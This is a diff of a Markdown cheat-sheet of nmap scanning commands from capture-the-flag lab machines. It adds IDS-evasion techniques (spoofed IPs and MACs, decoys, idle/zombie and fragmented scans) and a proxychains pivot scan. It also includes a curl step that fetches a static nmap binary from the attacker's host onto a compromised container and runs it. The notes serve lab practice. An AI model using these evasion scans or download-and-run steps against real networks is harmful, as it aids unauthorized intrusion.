@@ -49,93 +49,86 @@ Three core scan types for discovering running TCP and UDP services on a target h
 
 ---
 
-## Commands Used
+## Advanced / Evasion Scans
 
-### Kenobi / Internal / Decryptify — Fast all-port discovery before targeted service scans
-```bash
-nmap -sS -p- -n -Pn --min-rate 5000 $TARGET --open
-nmap -sS -p- --open -n -Pn --min-rate 5000 $TARGET -oN silent
-nmap -sS -p- -n -Pn --min-rate 5000 $TARGET --open -oN silent
-```
-Used on: **Kenobi**, **Internal**, **Decryptify**
+These scan types rely on setting TCP flags in unexpected ways to prompt ports for a reply. Null, FIN, and Xmas scans provoke a response from **closed ports**, while Maimon, ACK, and Window scans provoke a response from **open and closed ports**.
+
+| Port Scan Type       | Example Command                                          |
+|----------------------|----------------------------------------------------------|
+| Null Scan            | `sudo nmap -sN 10.129.168.83`                            |
+| FIN Scan             | `sudo nmap -sF 10.129.168.83`                            |
+| Xmas Scan            | `sudo nmap -sX 10.129.168.83`                            |
+| Maimon Scan          | `sudo nmap -sM 10.129.168.83`                            |
+| ACK Scan             | `sudo nmap -sA 10.129.168.83`                            |
+| Window Scan          | `sudo nmap -sW 10.129.168.83`                            |
+| Custom Scan          | `sudo nmap --scanflags URGACKPSHRSTSYNFIN 10.129.168.83` |
+| Spoofed Source IP    | `sudo nmap -S SPOOFED_IP 10.129.168.83`                  |
+| Spoofed MAC Address  | `nmap --spoof-mac SPOOFED_MAC`                           |
+| Decoy Scan           | `nmap -D DECOY_IP,ME 10.129.168.83`                      |
+| Idle (Zombie) Scan   | `sudo nmap -sI ZOMBIE_IP 10.129.168.83`                  |
+| Fragment IP (8 bytes)  | `nmap -f 10.129.168.83`                                |
+| Fragment IP (16 bytes) | `nmap -ff 10.129.168.83`                               |
+
+| Option                  | Purpose                                      |
+|-------------------------|----------------------------------------------|
+| `--source-port PORT_NUM` | Specify source port number                  |
+| `--data-length NUM`      | Append random data to reach the given length |
+
+### Output & Verbosity
+
+| Option    | Purpose                                    |
+|-----------|--------------------------------------------|
+| `--reason` | Explains how nmap made its conclusion     |
+| `-v`       | Verbose                                   |
+| `-vv`      | Very verbose                              |
+| `-d`       | Debugging                                 |
+| `-dd`      | More details for debugging                |
 
 ---
 
-### Wreath — External Webmin discovery + internal TCP-connect scan through SOCKS
+## Commands Used
+
+### Standard two-phase pattern (most machines)
+```bash
+# Phase 1 — fast all-port SYN discovery
+nmap -sS -p- -n -Pn --min-rate 5000 --open $TARGET -oN silent
+
+# Phase 2 — service/version/script scan on confirmed ports only
+nmap -sVC -p<PORTS> $TARGET -oN service
+```
+Used on: **Kenobi**, **Internal**, **Decryptify**, **Vulnerability Capstone**, **Team**, **IDE**, **Bookstore**, **Lookup**, **bsidesgtdav**, **bsidesgtthompson**, **coldvvars**
+
+---
+
+### Wreath — proxychains pivot (TCP-connect through SOCKS)
 ```bash
 nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent-web-server
 nmap -sVC -p22,80,443,10000 $TARGET -oN service-web-server
 proxychains nmap -sT -Pn -n 10.200.180.1-255 -oN scan
 ```
-Used on: **Wreath**
+Used on: **Wreath** — `-sT` required when routing through proxychains (no raw sockets).
 
 ---
 
-### Vulnerability Capstone — Fast all-port discovery then targeted service scan
-```bash
-nmap -sS --min-rate 5000 -Pn -n -p- $TARGET -oN silent
-nmap -sVC -p22,80 $TARGET -oN service
-```
-Used on: **Vulnerability Capstone** — found SSH and Apache before Fuel CMS enumeration.
-
-- `-Pn` — skip host discovery and treat the host as online
-- `-n` — disable DNS lookups
-- `--min-rate 5000` — keep discovery fast on lab targets
-
----
-
-### Kobold / CCTV / DevArea — Full TCP scan with service/version detection + default scripts
+### Kobold / CCTV / DevArea — full TCP with scripts (no two-phase)
 ```bash
 nmap -sC -sV -p- TARGET_IP
 ```
 Used on: **Kobold**, **CCTV**, **DevArea**
 
-- `-sC` — run default NSE scripts
-- `-sV` — detect service versions
-- `-p-` — scan all 65535 TCP ports
-
 ---
 
-### Overwatch — Targeted scan against specific AD ports (no ping, no DNS)
+### Overwatch — targeted AD port list (no ping, no DNS)
 ```bash
 nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389,49664,49667,49958,49959,55427,57249,59340,59343 -Pn -n TARGET_IP
 ```
 Used on: **Overwatch**
 
-- `-sVC` — combined service detection + default scripts
-- `-Pn` — skip host discovery (treat as online)
-- `-n` — no DNS resolution
-
 ---
 
-### Team / IDE — Two-phase: fast stealth discovery → targeted service scan
+### ohmyweb — static binary drop inside stripped container
 ```bash
-# Phase 1 — find open ports quickly (SYN scan, no DNS, high rate)
-nmap -sS -p- --min-rate 5000 -n TARGET_IP
-
-# Phase 2 — service/version/script scan on discovered ports only
-nmap -sVC -p21,22,80 TARGET_IP -oA service-scan
-```
-Used on: **Team**, **IDE**
-
-- `-sS` — SYN (stealth) scan
-- `--min-rate 5000` — send at least 5000 packets/second
-- `-oA` — output to all three formats (`.nmap`, `.gnmap`, `.xml`)
-
----
-
-### MonitorsFour — Focused HTTP/WinRM check
-```
-80/tcp    open  http    nginx
-5985/tcp  open  http    Microsoft HTTPAPI httpd 2.0
-```
-Used on: **MonitorsFour**
-
----
-
-### ohmyweb — Static binary inside a stripped container (no nmap installed)
-```bash
-# Attacker — host the static binary
+# Attacker — serve the binary
 cd ~/static-bins && sudo python3 -m http.server 80
 # https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
 
@@ -143,29 +136,21 @@ cd ~/static-bins && sudo python3 -m http.server 80
 curl -fsSL http://$LHOST/nmap -o /tmp/nmap && chmod +x /tmp/nmap
 /tmp/nmap 172.17.0.1 -p- --min-rate 5000
 ```
-Used on: **ohmyweb** — found OMI/OMIGOD on `5986/tcp`. Static-binary drop pattern: [container-network-pivoting.md](../../exploits/container/container-network-pivoting.md)
+Used on: **ohmyweb** — found OMI/OMIGOD on `5986/tcp`. See: [container-network-pivoting.md](../../exploits/container/container-network-pivoting.md)
 
 ---
 
-### Bookstore — Banner-grab specific ports after discovery sweep
+### Bandit — multi-target SYN scan from input file
 ```bash
-nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oA silent
-nmap -sVC -p22,80,5000,23636,36497 $TARGET -oA service
-# 5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9) <- Werkzeug debug -> werkzeug-debug-rce.md
+# What it does: SYN-scan all ports across a list of IPs loaded from a file.
+# Why here: enumerate multiple hosts in a network range without typing each IP.
+nmap -sS -p- -n -Pn --min-rate 5000 -iL targets.txt --open -oN silent-targets
+
+# Then service/version scan on confirmed ports per host
+nmap -sVC -p 22,80,631,8002 10.200.30.101 -oN service-10.200.30.101
+nmap -sVC -p 135,139,445,3389,5985 10.200.30.10 -oN service-10.200.30.10
 ```
-Used on: **Bookstore**
-### New TRY batch - fast all-port discovery and targeted service scans
-```bash
-nmap -sS --min-rate 5000 -p- -Pn -n --open $TARGET -oN silent
-nmap -sVC -p $TARGET -oN service
+Used on: **Bandit** — scanned the assigned network segment; discovered Ubuntu (ATS, CUPS, Hadoop) and Windows (RDP, WinRM, SMB) hosts.
 
-nmap -sS -n -Pn --min-rate 5000 -p- --open $TARGET -oN silent
-nmap -sVC -p80 $TARGET -oN service
-
-nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent
-nmap -sVC -p22,8009,8080 $TARGET -oN service
-
-nmap -sS -p- -n -Pn --min-rate 5000 --open --reason $TARGET -oN silent
-nmap -sVC -p22,139,445,8080,8082 $TARGET -oN service
-```
-Used on: **Lookup**, **bsidesgtdav**, **bsidesgtthompson**, **coldvvars** - same two-phase pattern: discover open TCP quickly, then run scripts/version detection only on confirmed ports.
+- `-iL targets.txt` — read target IPs/ranges from a file instead of the command line
+- One output file per host keeps service results cleanly separated
